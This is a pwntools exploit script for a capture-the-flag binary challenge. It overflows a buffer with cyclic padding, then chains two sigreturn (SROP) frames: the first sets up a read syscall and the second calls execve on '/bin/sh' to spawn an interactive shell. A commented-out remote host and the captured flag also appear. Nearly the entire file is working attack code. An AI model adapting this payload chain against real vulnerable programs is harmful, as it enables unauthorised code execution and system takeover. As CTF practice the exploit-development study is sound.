from pwn import *
context.binary = "./chall"
#context.arch = 'i386'
script = """
b*0x8049000
"""


#p = remote("chall.w1playground.com",65014)
p = process()
int_80 = 0x8049017
read = 0x804900b
ret = 0x804901f
frame = SigreturnFrame(kernel='amd64')

write_and_read = 0x804902e
frame.eax = 0x3
frame.ebx = 0
frame.ecx = 0x804a008+0x20
frame.edx = 0x1000
frame.esp = 0x804a008+8+0x20
frame.eip = int_80

print(bytes(frame))
print(len(bytes(frame)))


#
# print(bytes(frame))
# print(len(bytes(frame)))
# # print(bytes(frame))
# # print(len(bytes(frame)))

#gdb.attach(p,script)
p.send(cyclic(128)+p32(0x08049000)+p32(ret)+p32(0x8049017)+bytes(frame))
#payload = bytes(frame)

#p.sendline(payload)
#print(p.recv())
#+p32(int_80))
time.sleep(2)

payload2 = b'A'*0x77




p.send(payload2)

frame2 = SigreturnFrame(kernel='amd64')
frame2.eax = 0x0b
frame2.ebx = 0x804a008+0x20
frame2.ecx = 0
frame2.edx = 0
frame2.esp = 0x804a008+8+0x20
frame2.eip = int_80

time.sleep(2)
#gdb.attach(p,script)

payload3 = b'/bin/sh\x00'
payload3 += cyclic(128+8-len(payload3))+p32(0x08049000)+p32(int_80)+bytes(frame2)


p.sendline(payload3)

time.sleep(0.2)
p.sendline(cyclic(0x76))

p.interactive()

#W1{7ust_a_h3ll0_world_program!!!}